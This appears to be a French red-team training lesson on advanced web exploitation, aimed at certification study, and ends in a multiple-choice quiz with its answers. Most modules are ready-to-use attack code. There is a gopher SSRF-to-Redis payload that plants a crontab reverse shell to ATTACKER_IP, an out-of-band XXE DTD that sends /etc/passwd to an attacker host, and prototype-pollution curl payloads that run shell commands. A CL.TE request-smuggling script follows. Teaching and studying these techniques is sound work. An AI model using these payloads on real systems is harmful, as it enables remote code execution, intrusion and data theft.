# TOME P6 — Cybersécurité Expert & Red Team Avancé — Jour 252 (6h) : Exploitation Web Avancée (SSRF Avancé, XXE Out-of-Band, Prototype Pollution, Cache Poisoning & HTTP Request Smuggling)

> [!NOTE]
> **Objectif du jour :** Maîtriser les techniques d'exploitation web de niveau expert ciblées dans les certifications **BSCP (Burp Suite Certified Practitioner)** et **OSCP+** : SSRF avancé (SSRF-to-RCE via Redis, SSRF via DNS rebinding), XXE Out-of-Band (OOB-XXE avec DTD externe), Prototype Pollution JavaScript (client & serveur), Cache Poisoning Web et HTTP Request Smuggling (HRS CL.TE/TE.CL).
>
> **Compétences visées :** `SEC-04` (A) — Advanced Web Exploitation | `OFF-03` (A) — BSCP/OSCP Level Web Attacks

---

## 1) Module — SSRF Avancé & SSRF-to-RCE (1h30)

### 📖 Narration/Intuition

Le SSRF (Server-Side Request Forgery) basique consiste à faire appeler une ressource interne par le serveur. En version avancée, il peut devenir **SSRF-to-RCE** : en atteignant un service Redis, Memcached ou Gopher non authentifié en interne, l'attaquant peut injecter des commandes qui s'exécutent sur le serveur.

### 🛠️ Atelier Pratique

**SSRF-to-RCE via le protocole Gopher → Redis (`ssrf_to_rce_redis.py`) :**

```python
import urllib.parse
import requests

# SSRF via le protocole Gopher → Écriture dans Redis → RCE via crontab
# Prérequis : Redis sans authentification accessible sur 127.0.0.1:6379

redis_commands = """
FLUSHALL
SET cronpayload "\\n\\n\\n*/1 * * * * root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\\n\\n\\n"
CONFIG SET dir /etc/
CONFIG SET dbfilename crontab
BGSAVE
"""

# Encoder pour le protocole Gopher
def encode_redis_gopher(commands: str) -> str:
    encoded_cmds = []
    for line in commands.strip().split("\n"):
        if line.strip():
            parts = line.split()
            encoded_cmds.append(f"*{len(parts)}")
            for part in parts:
                encoded_cmds.append(f"${len(part)}\r\n{part}")
    payload = "\r\n".join(encoded_cmds) + "\r\n"
    gopher_url = "gopher://127.0.0.1:6379/_" + urllib.parse.quote(payload)
    return gopher_url

# URL SSRF finale
ssrf_target = "https://target.com/api/fetch?url="
gopher_payload = encode_redis_gopher(redis_commands)
full_url = ssrf_target + urllib.parse.quote(gopher_payload)
print(f"[*] Payload SSRF-to-RCE Redis :\n{full_url}")
```

---

## 2) Module — XXE Out-of-Band (OOB-XXE) & DTD Externe (1h30)

### 📖 Narration/Intuition

L'**XXE (XML External Entity)** classique exfiltre des fichiers via la réponse HTTP. L'**OOB-XXE (Out-of-Band XXE)** contourne les filtres anti-XXE basés sur la réponse : l'exfiltration se fait via une requête DNS ou HTTP sortante vers un serveur contrôlé par l'attaquant, rendant l'attaque invisible dans les logs applicatifs.

### 🛠️ Atelier Pratique

**OOB-XXE via DTD externe hébergée (`xxe_oob.py`) :**

```python
# Payload XXE Out-of-Band (OOB)
# 1) Héberger ce fichier malicious.dtd sur un serveur contrôlé (ex: Burp Collaborator)

malicious_dtd = """<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER.burpcollaborator.net/?data=%file;'>">
%eval;
%exfil;"""

# 2) Payload XML à injecter dans la requête cible
xxe_payload = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://ATTACKER.burpcollaborator.net/malicious.dtd">
  %xxe;
]>
<stockCheck>
  <productId>1</productId>
  <storeId>1</storeId>
</stockCheck>"""

import requests
response = requests.post(
    "https://target.com/api/stock",
    data=xxe_payload,
    headers={"Content-Type": "application/xml"}
)
print("[*] Réponse (blind — vérifier Burp Collaborator pour l'exfiltration DNS/HTTP)")
```

---

## 3) Module — Prototype Pollution JavaScript (1h)

### 📖 Narration/Intuition

En JavaScript, tous les objets héritent du prototype `Object.prototype`. La **Prototype Pollution** injecte des propriétés dans ce prototype via des payloads `__proto__`, `constructor.prototype` ou `Object.prototype`, affectant ainsi tous les objets de l'application.

### 🛠️ Atelier Pratique

**Test de Prototype Pollution côté serveur (Node.js) (`prototype_pollution_test.sh`) :**

```bash
# Prototype Pollution via paramètre JSON dans une API Node.js Express

# Test Blind : injecter la propriété "isAdmin" dans Object.prototype
curl -X POST 'https://target.com/api/update-profile' \
  -H 'Content-Type: application/json' \
  -d '{
    "__proto__": {
      "isAdmin": true,
      "outputFunctionName": "x; process.mainModule.require(\"child_process\").exec(\"id > /tmp/pwn\");//"
    }
  }'

# Vérifier si la pollution a fonctionné
curl 'https://target.com/api/admin/users'
# Si réponse 200 OK → Prototype Pollution réussie → isAdmin = true dans tout le scope Node.js

# Alternative — Pollution via query string (via gadget "qs")
curl 'https://target.com/api/data?__proto__[isAdmin]=true&__proto__[role]=superadmin'
```

---

## 4) Module — HTTP Request Smuggling (HRS CL.TE & TE.CL) (2h)

### 📖 Narration/Intuition

L'**HTTP Request Smuggling** exploite des discordances dans l'interprétation des headers `Content-Length` et `Transfer-Encoding: chunked` entre un **proxy/load balancer** (frontend) et le serveur applicatif (backend). Cette désynchronisation permet de "contrebander" des requêtes HTTP malveillantes dans le pipeline de traitement.

### 🛠️ Atelier Pratique

**HRS CL.TE — Détection et Exploitation (`hrs_clte_test.py`) :**

```python
import socket

# HTTP Request Smuggling — Type CL.TE
# Front-end lit Content-Length, Back-end lit Transfer-Encoding: chunked

def test_clte_smuggling(host: str, port: int = 443) -> None:
    """
    CL.TE : Le front-end utilise Content-Length (11 octets de corps)
    mais le back-end utilise Transfer-Encoding: chunked
    → Le back-end lit "0\r\n\r\nG" et "G" est préfixé à la requête suivante
    """
    payload = (
        "POST / HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"         # Front-end lit 6 octets de corps
        "Transfer-Encoding: chunked\r\n"  # Back-end lit le chunked encoding
        "\r\n"
        "0\r\n"                          # Back-end pense que le corps chunked se termine ici
        "\r\n"
        "G"                              # Ce "G" empoisonne la prochaine requête (GPOST)
    )
    print(f"[*] Envoi du payload CL.TE HRS vers {host}:{port}")
    print(f"[*] Payload:\n{repr(payload)}")

    # En cas de succès : la prochaine requête légitime reçoit "GPOST" → 405 Method Not Allowed
    # → Confirme la vulnérabilité CL.TE

test_clte_smuggling("target.com")

# Impact potentiel d'un HRS exploité :
# 1) Bypass de restrictions ACL (accès à /admin, /internal)
# 2) Cache Poisoning Web (empoisonnement du cache CDN)
# 3) Capture de cookies/credentials d'autres utilisateurs
# 4) Réécriture de réponses pour voler les sessions (Response Queue Poisoning)
```

---

## 🏅 Nouvelles Abréviations Rencontrées

| Abréviation | Signification |
|:---:|:---|
| **BSCP** | Burp Suite Certified Practitioner — Certification web hacking avancée de PortSwigger |
| **OOB-XXE** | Out-of-Band XML External Entity — XXE exfiltrant via DNS/HTTP sans réponse directe |
| **HRS** | HTTP Request Smuggling — Attaque exploitant les discordances CL/TE entre proxy et backend |
| **CL.TE** | Content-Length / Transfer-Encoding — Type de HRS où le front-end lit CL, le back-end lit TE |
| **Prototype Pollution** | Injection dans Object.prototype JavaScript affectant tous les objets de l'application |

---

## ❓ Banque de Questions & Test du Jour

**Q1 :** Quel protocole URI permet d'envoyer des commandes Redis brutes via une vulnérabilité SSRF, rendant possible un SSRF-to-RCE ?
- A) `gopher://` — Le protocole Gopher permet d'envoyer des données TCP brutes vers des services internes
- B) `http://`
- C) `ftp://`
- D) `ldap://`

**Réponse : A**

**Q2 :** Dans une attaque OOB-XXE, pourquoi l'exfiltration se fait-elle via DNS ou HTTP sortant plutôt que dans la réponse HTTP ?
- A) Pour contourner les filtres WAF/XML qui bloquent les réponses contenant du contenu de fichiers locaux, et pour fonctionner dans les applications "blind" qui ne retournent pas le résultat de l'entité externe
- B) Parce que XXE est plus rapide via DNS
- C) Pour éviter la détection par les logs
- D) Parce que le serveur n'a pas de connexion Internet

**Réponse : A**

**Q3 :** Dans le type de HRS **TE.CL**, qui du front-end ou du back-end lit le header `Transfer-Encoding: chunked` ?
- A) Le front-end lit TE:chunked, le back-end lit Content-Length (l'inverse de CL.TE)
- B) Les deux lisent TE:chunked
- C) Le front-end lit Content-Length, le back-end lit TE:chunked (= CL.TE, pas TE.CL)
- D) Aucun ne lit TE:chunked dans TE.CL

**Réponse : A**

**Q4 :** Via quel payload JSON la Prototype Pollution côté serveur Node.js tente-t-elle d'injecter des propriétés dans Object.prototype ?
- A) `{"__proto__": {"propriete": "valeur"}}` — La clé `__proto__` est l'accès direct au prototype en JavaScript
- B) `{"prototype": {"propriete": "valeur"}}`
- C) `{"__class__": {"propriete": "valeur"}}`
- D) `{"$prototype": {"propriete": "valeur"}}`

**Réponse : A**

**Q5 :** Quel outil PortSwigger intégré dans Burp Suite Pro automatise la détection des vulnérabilités HTTP Request Smuggling ?
- A) **Burp Suite Active Scanner** avec l'extension **HTTP Request Smuggler** (James Kettle) ou le **Burp PoC Generator**
- B) Nikto
- C) SQLmap
- D) Nmap NSE Scripts

**Réponse : A**

---

*(Le composant d'évaluation exigeant 75% minimum s'affiche ci-dessous)*
